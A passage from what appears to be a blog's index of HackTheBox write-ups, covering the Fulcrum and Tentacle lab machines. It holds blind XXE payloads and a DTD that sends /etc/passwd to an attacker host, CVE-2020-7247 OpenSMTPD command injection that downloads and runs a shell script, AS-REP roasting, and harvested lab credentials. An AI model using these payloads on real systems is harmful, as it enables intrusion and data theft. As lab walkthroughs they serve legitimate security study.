--min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:44 BST Nmap scan report for 10.10.10.62 (10.10.10.62) Host is up (0.093s latency). Not shown: 65468 filtered tcp ports (no-response), 65 closed tcp ports (conn-refused) PORT STATE SERVICE 4/tcp open unknown 22/tcp open ssh 80/tcp open http 88/tcp open kerberos-sec 9999/tcp open abyss 56423/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds ─$ nmap -p4,22,80,88,9999,56423 -sC -sV 10.10.10.62 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:47 BST Nmap scan report for 10.10.10.62 (10.10.10.62) Host is up (0.14s latency). PORT STATE SERVICE VERSION 4/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: nginx/1.18.0 (Ubuntu) 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Input string was not in a correct format. | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: nginx/1.18.0 (Ubuntu) 88/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: phpMyAdmin | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: nginx/1.18.0 (Ubuntu) 9999/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Input string was not in a correct format. | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: nginx/1.18.0 (Ubuntu) 56423/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: Fulcrum-API Beta |_http-title: Site doesn\u0026#39;t have a title (application/json;charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.53 seconds Port 4 └─$ feroxbuster -u http://10.10.10.62:4 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k -x php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.62:4 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 1l 6w 110c http://10.10.10.62:4/index.php 200 GET 1l 6w 110c http://10.10.10.62:4/ 200 GET 1l 6w 54c http://10.10.10.62:4/upload.php 200 GET 13l 27w 312c http://10.10.10.62:4/home.php Port 80 └─$ feroxbuster -u http://10.10.10.62 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k -x asp,aspx ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.62 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [asp, aspx] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 108l 372w 5252c http://10.10.10.62/ Port 88 Port 9999 Port 56423 └─$ feroxbuster -u http://10.10.10.62:56423 -m GET,POST,PUT,DELETE ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.62:56423 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET, POST, PUT, DELETE] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 405 PUT 7l 12w 166c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 405 DELETE 7l 12w 166c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 2l 1w 31c http://10.10.10.62:56423/ 200 POST 2l 1w 31c http://10.10.10.62:56423/ Foothold Nothing interesting We have a port API on port 56423 It looks like it\u0026rsquo;s a custom API We can play around with different payloads Was stuck here for a while After receiving a hint about xml, I tried a xml payloads Sending Ping now, we receive Ping back So let\u0026rsquo;s try XXE We could try one of the payloads https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe We don\u0026rsquo;t receive any output, so we should try blind xxe \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://10.10.16.9/anything\u0026#34;\u0026gt; %xxe;]\u0026gt; And we have a hit Let\u0026rsquo;s try exfil https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013 The payload that we will send \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE data SYSTEM \u0026#34;http://10.10.16.9/evil.dtd\u0026#34;\u0026gt; \u0026lt;data\u0026gt;\u0026amp;send;\u0026lt;/data\u0026gt; The .dtd file we host on our server \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % all \u0026#34;\u0026lt;!ENTITY send SYSTEM \u0026#39;http://10.10.16.9/?%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %all; And we have a hit The source code \u0026lt;?php header(\u0026#39;Content-Type:application/json;charset=utf-8\u0026#39;); header(\u0026#39;Server: Fulcrum-API Beta\u0026#39;); libxml_disable_entity_loader (false); $xmlfile = file_get_contents(\u0026#39;php://input\u0026#39;); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD); $input = simplexml_import_dom($dom); $output = $input-\u0026gt;Ping; //check if ok if($output == \u0026#34;Ping\u0026#34;) { $data = array(\u0026#39;Heartbeat\u0026#39; =\u0026gt; array(\u0026#39;Ping\u0026#39; =\u0026gt; \u0026#34;Ping\u0026#34;)); }else{ $data = array(\u0026#39;Heartbeat\u0026#39; =\u0026gt; array(\u0026#39;Ping\u0026#39; =\u0026gt; \u0026#34;Pong\u0026#34;)); } echo json_encode($data); ?\u0026gt; User Root ","date":"September 27, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/fulcrum/images/fulcrum.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/fulcrum/","summary":"Fulcrum Enumeration nmap └─$ nmap -p- 10.10.10.62 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:44 BST Nmap scan report for 10.10.10.62 (10.10.10.62) Host is up (0.093s latency). Not shown: 65468 filtered tcp ports (no-response), 65 closed tcp ports (conn-refused) PORT STATE SERVICE 4/tcp open unknown 22/tcp open ssh 80/tcp open http 88/tcp open kerberos-sec 9999/tcp open abyss 56423/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 13.","tags":["HTB"],"title":"[HTB] Machine: Fulcrum"},{"categories":null,"contents":"Tentacle Enumeration nmap └─$ nmap -Pn -p- 10.10.10.224 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:09 BST Nmap scan report for 10.10.10.224 (10.10.10.224) Host is up (0.093s latency). Not shown: 65495 filtered tcp ports (no-response), 36 filtered tcp ports (host-unreach) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds └─$ nmap -Pn -p22,53,88,3128 -sC -sV 10.10.10.224 -T4 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:12 BST Nmap scan report for 10.10.10.224 (10.10.10.224) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA) | 256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA) |_ 256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519) 53/tcp open domain ISC BIND 9.11.20 (RedHat Enterprise Linux 8) | dns-nsid: |_ bind.version: 9.11.20-RedHat-9.11.20-5.el8 88/tcp open kerberos-sec MIT Kerberos (server time: 2023-09-26 19:11:56Z) 3128/tcp open http-proxy Squid http proxy 4.11 |_http-server-header: squid/4.11 |_http-title: ERROR: The requested URL could not be retrieved Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds └─$ sudo nmap -Pn -sU 10.10.10.224 -T4 --min-rate 5000 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 20:13 BST Nmap scan report for 10.10.10.224 (10.10.10.224) Host is up (0.10s latency). Not shown: 991 open|filtered udp ports (no-response) PORT STATE SERVICE 53/udp open domain 88/udp open kerberos-sec 123/udp open ntp 17787/udp filtered unknown 20560/udp filtered unknown 21016/udp filtered unknown 40019/udp filtered unknown 44185/udp filtered unknown 49179/udp filtered unknown dns └─$ dig axfr @10.10.10.224 ;; communications error to 10.10.10.224#53: timed out ;; communications error to 10.10.10.224#53: timed out ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.224 ; (1 server found) ;; global options: +cmd ;; Query time: 175 msec ;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP) ;; WHEN: Wed Sep 27 17:09:26 BST 2023 ;; MSG SIZE rcvd: 56 └─$ dig realcorp.htb @10.10.10.224 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; realcorp.htb @10.10.10.224 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 20726 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 1d3b122485d1c4e6706e605e651453ed994c22dca6111a8b (good) ;; QUESTION SECTION: ;realcorp.htb. IN A ;; AUTHORITY SECTION: realcorp.htb. 86400 IN SOA realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400 ;; Query time: 91 msec ;; SERVER: 10.10.10.224#53(10.10.10.224) (UDP) ;; WHEN: Wed Sep 27 17:11:02 BST 2023 ;; MSG SIZE rcvd: 110 └─$ dig axfr realcorp.htb @10.10.10.224 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr realcorp.htb @10.10.10.224 ;; global options: +cmd ; Transfer failed. dnsenum └─$ dnsenum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt realcorp.htb dnsenum VERSION:1.2.6 ----- realcorp.htb ----- Host\u0026#39;s addresses: __________________ Name Servers: ______________ ns.realcorp.htb. 259200 IN A 10.197.243.77 Mail (MX) Servers: ___________________ Trying Zone Transfers and getting Bind Versions: _________________________________________________ unresolvable name: ns.realcorp.htb at /usr/bin/dnsenum line 900. Trying Zone Transfer for realcorp.htb on ns.realcorp.htb ... AXFR record query failed: no nameservers Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt: ________________________________________________________________________________________ ns.realcorp.htb. 259200 IN A 10.197.243.77 proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb. ns.realcorp.htb. 259200 IN A 10.197.243.77 wpad.realcorp.htb. 259200 IN A 10.197.243.31 kerbrute └─$ ./kerbrute userenum -d realcorp.htb --dc realcorp.htb /usr/share/seclists/Usernames/cirt-default-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 09/27/23 - Ronnie Flathers @ropnop 2023/09/27 17:24:12 \u0026gt; Using KDC(s): 2023/09/27 17:24:12 \u0026gt; realcorp.htb:88 2023/09/27 17:24:27 \u0026gt; Done! Tested 828 usernames (0 valid) in 15.460 seconds ntp └─$ sudo nmap -Pn --script \u0026#34;ntp*\u0026#34; -sU -sV -p123 realcorp.htb [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 17:27 BST Nmap scan report for realcorp.htb (10.10.10.224) Host is up (0.13s latency). PORT STATE SERVICE VERSION 123/udp open ntp NTP v4 (secondary server) | ntp-info: |_ receive time stamp: 2023-09-27T16:26:39 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds └─$ date; ntpdate -q 10.10.10.224 Wed Sep 27 05:30:03 PM BST 2023 2023-09-27 17:29:22.601161 (+0100) -40.729112 +/- 0.083173 10.10.10.224 s10 no-leap squid version 4.11 srv01.realcorp.htb user: j.nakazawa@realcorp.htb Foothold Let\u0026rsquo;s check if j.nakazawa is AS-REP-Roastable └─$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.224 realcorp.htb/j.nakazawa Impacket v0.11.0 - Copyright 2023 Fortra [*] Getting TGT for j.nakazawa $krb5asrep$18$j.nakazawa$REALCORP.HTB$0e2ddaebe3ed76c6aa85e8bc$7aa604e7c0c0c585c6605f846cfce4f16b40d26cac17809f054ba04226ca479e19e10c81f1e62a7fe1e50311adb70d48699b9ce5f92d147affb275ee2978fd6bd3ad79c392a034d5b1befa2543592e0855195eec320da94782b579a0e6be3d4e3c63b95bb511216e84e22ebe6bab9fbb82c6ec7a92580215d47f9a5e7b65924d358d06f16c6a55aa940f859302c5fa51cd8a50d949e0b2168f0a9bf676cf850efb5fcae6b71eaa3c10948dd357aa887b2d69581f54200448a949e3a5b47c76f0274092f244f8be56f50ba7a3af76d36450aae88e8daa3c4d77f943e19f Can\u0026rsquo;t crack it └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:01 DONE (2023-09-27 17:48) 0g/s 7924Kp/s 7924Kc/s 7924KC/s !SkicA!..*7¡Vamos! Session completed. We saw squid-proxy on port 3128 https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid Let\u0026rsquo;s try enumerating it Let\u0026rsquo;s first create a config strict_chain proxy_dns [ProxyList] http 10.10.10.224 3128 Now let\u0026rsquo;s nmap First I tried 10.197.243.77 and 10.197.243.31 (ips from dnsenum), but it failed Then I tried 127.0.0.1 and had the results └─$ sudo proxychains -q -f proxy-to-squid.conf nmap --top-ports 1000 -sT -Pn 127.0.0.1 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 16:45 BST Nmap scan report for localhost (127.0.0.1) Host is up (0.32s latency). Not shown: 994 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 464/tcp open kpasswd5 749/tcp open kerberos-adm 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 305.98 seconds Nothing interesting, except the same squid proxy Let\u0026rsquo;s chain the proxies strict_chain proxy_dns [ProxyList] http 10.10.10.224 3128 http 127.0.0.1 3128 Let\u0026rsquo;s nmap again 10.197.243.77 works But 10.197.243.31 fails └─$ sudo proxychains -q -f proxy-to-squid.conf nmap --top-ports 1000 -sT -Pn 10.197.243.77 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 16:54 BST Nmap scan report for 10.197.243.77 (10.197.243.77) Host is up (0.54s latency). Not shown: 994 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 464/tcp open kpasswd5 749/tcp open kerberos-adm 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 555.24 seconds The same process again Add another proxy in our config http 10.197.243.77 3128 So current chain is 10.10.10.224 –\u0026gt; 127.0.0.1 –\u0026gt; 10.197.243.77 And run nmap again on 10.197.243.31 └─$ sudo proxychains -q -f proxy-to-squid.conf nmap --top-ports 1000 -sT -Pn 10.197.243.31 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 17:07 BST Nmap scan report for 10.197.243.31 (10.197.243.31) Host is up (0.65s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 464/tcp open kpasswd5 749/tcp open kerberos-adm 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 654.09 seconds Now we see port 80 I opened firefox as proxychains -f proxy-to-squid.conf firefox Visiting http://10.197.243.31/ shows default page While http://wpad.realcorp.htb/ results in 403 But if we check for http://wpad.realcorp.htb/wpad.dat https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#wpad function FindProxyForURL(url, host) { if (dnsDomainIs(host, \u0026#34;realcorp.htb\u0026#34;)) return \u0026#34;DIRECT\u0026#34;; if (isInNet(dnsResolve(host), \u0026#34;10.197.243.0\u0026#34;, \u0026#34;255.255.255.0\u0026#34;)) return \u0026#34;DIRECT\u0026#34;; if (isInNet(dnsResolve(host), \u0026#34;10.241.251.0\u0026#34;, \u0026#34;255.255.255.0\u0026#34;)) return \u0026#34;DIRECT\u0026#34;; return \u0026#34;PROXY proxy.realcorp.htb:3128\u0026#34;; } We have another subnet Let\u0026rsquo;s scan it └─$ for i in {1..254}; do (dig +noall +answer @10.10.10.224 -x 10.241.251.$i \u0026amp;); done 113.251.241.10.in-addr.arpa. 259200 IN PTR srvpod01.realcorp.htb. We have another host Let\u0026rsquo;s nmap it └─$ sudo proxychains -q -f proxy-to-squid.conf nmap --top-ports 1000 -sT -Pn 10.241.251.113 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 17:36 BST Nmap scan report for srvpod01.realcorp.htb (10.241.251.113) Host is up (0.63s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 25/tcp open smtp Nmap done: 1 IP address (1 host up) scanned in 646.00 seconds └─$ sudo proxychains -q -f proxy-to-squid.conf nmap -p25 -sC -sV -sT -Pn 10.241.251.113 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 17:47 BST Nmap scan report for srvpod01.realcorp.htb (10.241.251.113) Host is up (1.2s latency). PORT STATE SERVICE VERSION 25/tcp open smtp OpenSMTPD | smtp-commands: smtp.realcorp.htb Hello srvpod01.realcorp.htb [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info Service Info: Host: smtp.realcorp.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds We have OpenSMTPD 2.0.0 which could be exploited via CVE-2020-7247 The PoC └─$ sudo proxychains -f proxy-to-squid.conf nc 10.241.251.113 25 [proxychains] config file found: proxy-to-squid.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 10.10.10.224:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.241.251.113:25 ... OK 220 smtp.realcorp.htb ESMTP OpenSMTPD HELO x 250 smtp.realcorp.htb Hello x [10.241.251.1], pleased to meet you MAIL FROM:\u0026lt;;ping -c 1 10.10.16.9;\u0026gt; 250 2.0.0 Ok RCPT TO:\u0026lt;j.nakazawa@realcorp.htb\u0026gt; 250 2.1.5 Destination address valid: Recipient ok DATA 354 Enter mail, end with \u0026#34;.\u0026#34; on a line by itself TEST . 250 2.0.0 cd353533 Message accepted for delivery └─$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 16:53:14.282393 IP realcorp.htb \u0026gt; 10.10.16.9: ICMP echo request, id 15, seq 1, length 64 16:53:14.282435 IP 10.10.16.9 \u0026gt; realcorp.htb: ICMP echo reply, id 15, seq 1, length 64 Now, let\u0026rsquo;s get a reverse shell We have to replace the root with j.nakazawa@realcorp.htb for PoC to work Playing around with different cmd payloads The one that works is wget \u0026lt;ip\u0026gt; └─$ sudo proxychains -f proxy-to-squid.conf python3 cve-2020-7247.py 10.241.251.113 25 \u0026#34;wget 10.10.16.9\u0026#34; [proxychains] config file found: proxy-to-squid.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 10.10.10.224:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.241.251.113:25 ... OK [*] OpenSMTPD detected [*] Connected, sending payload [*] Payload sent [*] Done └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.224 - - [30/Sep/2023 17:10:52] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Now, let\u0026rsquo;s send a reverse shell payload While troubleshooting manually there are bad chars that opensmtp doesn\u0026rsquo;t like, so I had to play around with different payloads └─$ sudo proxychains -f proxy-to-squid.conf python3 cve-2020-7247.py 10.241.251.113 25 \u0026#34;wget 10.10.16.9/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh\u0026#34; [proxychains] config file found: proxy-to-squid.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 10.10.10.224:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.241.251.113:25 ... OK [*] OpenSMTPD detected [*] Connected, sending payload [*] Payload sent [*] Done User #1 During enumeration, I found a .msmtprc file in j.nakazawa\u0026rsquo;s home directory We have potential creds for j.nakazawa:sJB}RM\u0026gt;6Z~64_ root@smtp:/home/j.nakazawa# ls -lha ls -lha total 16K drwxr-xr-x. 1 j.nakazawa j.nakazawa 59 Dec 9 2020 . drwxr-xr-x. 1 root root 24 Dec 8 2020 .. lrwxrwxrwx. 1 root root 9 Nov 15 2021 .bash_history -\u0026gt; /dev/null -rw-r--r--. 1 j.nakazawa j.nakazawa 220 Apr 18 2019 .bash_logout -rw-r--r--. 1 j.nakazawa j.nakazawa 3.5K Apr 18 2019 .bashrc -rw-------. 1 j.nakazawa j.nakazawa 476 Dec 8 2020 .msmtprc -rw-r--r--. 1 j.nakazawa j.nakazawa 807 Apr 18 2019 .profile lrwxrwxrwx. 1 root root 9 Nov 15 2021 .viminfo -\u0026gt; /dev/null root@smtp:/home/j.nakazawa# cat .msmtprc cat .msmtprc # Set default values for all following accounts. defaults auth on tls on tls_trust_file /etc/ssl/certs/ca-certificates.crt logfile /dev/null # RealCorp Mail account realcorp host 127.0.0.1 port 587 from j.nakazawa@realcorp.htb user j.nakazawa password sJB}RM\u0026gt;6Z~64_ tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60 # Set a default account account default : realcorp If we try to ssh, it fails └─$ sshpass -p \u0026#39;sJB}RM\u0026gt;6Z~64_\u0026#39; ssh j.nakazawa@10.10.10.224 Permission denied, please try again. └─$ sudo proxychains -q -f proxy-to-squid.conf sshpass -p \u0026#39;sJB}RM\u0026gt;6Z~64_\u0026#39; ssh j.nakazawa@10.197.243.77 Warning: Permanently added \u0026#39;10.197.243.77\u0026#39; (ED25519) to the list of known hosts. Permission denied, please try again. └─$ sudo proxychains -q -f proxy-to-squid.conf sshpass -p \u0026#39;sJB}RM\u0026gt;6Z~64_\u0026#39; ssh j.nakazawa@10.197.243.31 Warning: Permanently added \u0026#39;10.197.243.31\u0026#39; (ED25519) to the list of known hosts. Permission denied, please try again. But we also saw a kerberos running So let\u0026rsquo;s try creds there Change the /etc/krb5.conf [libdefaults] default_realm = REALCORP.HTB # The following krb5.conf variables are only for MIT Kerberos. kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true rdns = false # The following libdefaults parameters are only for Heimdal Kerberos. fcc-mit-ticketflags = true [realms] REALCORP.HTB = { kdc = realcorp.htb master_kdc = realcorp.htb admin_server = realcorp.htb default_domain = realcorp.htb } [domain_realm] .realcorp.htb = REALCORP.HTB realcorp.htb = REALCORP.HTB\tNow, let\u0026rsquo;s ask for a ticket And we got one Also we might need to run ntpdate 10.10.10.224 to sync with the box, since kerberos requires that └─$ kinit j.nakazawa Password for j.nakazawa@REALCORP.HTB: └─$ klist Ticket cache: FILE:/tmp/krb5cc_1000 Default principal: j.nakazawa@REALCORP.HTB Valid starting Expires Service principal 09/30/2023 17:33:09 10/01/2023 17:33:09 krbtgt/REALCORP.HTB@REALCORP.HTB If we now try ssh we are asked for password So troubleshooting shows that it can\u0026rsquo;t find host/10.10.10.224@REALCORP.HTB To solve this issue, we have to place srv01.realcrop.htb to be the first dns name in /etc/hosts/ for the box 10.10.10.224 srv01.realcorp.htb realcorp.htb root.realcorp.htb └─$ ssh j.nakazawa@10.10.10.224 -vv OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.9 30 May 2023 ... debug1: Authentications that can continue: gssapi-keyex,gssapi-with-mic,password debug1: Next authentication method: gssapi-with-mic debug1: Unspecified GSS failure. Minor code may provide more information Server host/10.10.10.224@REALCORP.HTB not found in Kerberos database To ssh we had to use specific options found it post below https://uz.sns.it/~enrico/site/posts/kerberos/password-less-ssh-login-with-kerberos.html └─$ ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes -o GSSAPIServerIdentity=srv01.realcorp.htb j.nakazawa@REALCORP.HTB Activate the web console with: systemctl enable --now cockpit.socket Last failed login: Sat Sep 30 17:50:24 BST 2023 from 10.10.16.9 on ssh:notty There was 1 failed login attempt since the last successful login. Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2 [j.nakazawa@srv01 ~]$ User #2 linpeas shows interesting file /usr/local/bin/log_backup.sh It is used in crontab ╔══════════╣ Backup files (limited 100) -rwxr-xr--. 1 root admin 229 Dec 9 2020 /usr/local/bin/log_backup.sh -r--r--r--. 1 root root 2762 Aug 17 2020 /usr/share/man/man8/vgcfgbackup.8.gz -rw-r--r--. 1 root root 2670 Dec 8 2016 /usr/share/man/man1/db_hotbackup.1.gz -rw-r--r--. 1 root root 17740 Dec 24 2020 /usr/share/info/dir.old ... SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed * * * * * admin /usr/local/bin/log_backup.sh Content of the script [j.nakazawa@srv01 